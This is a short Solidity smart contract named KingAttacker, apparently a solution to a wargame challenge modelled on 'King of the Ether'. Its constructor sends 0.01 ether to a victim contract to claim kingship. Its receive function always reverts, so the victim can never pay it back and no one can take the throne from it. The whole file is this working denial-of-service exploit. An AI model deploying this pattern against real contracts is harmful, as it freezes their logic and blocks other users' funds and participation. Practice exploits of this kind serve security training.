pragma solidity ^0.8.0;

contract KingAttacker{

    constructor(address _victim) payable {
        _victim.call{value: 10000000000000000 wei}("");
    }

    receive() external payable {
        revert();
    }
}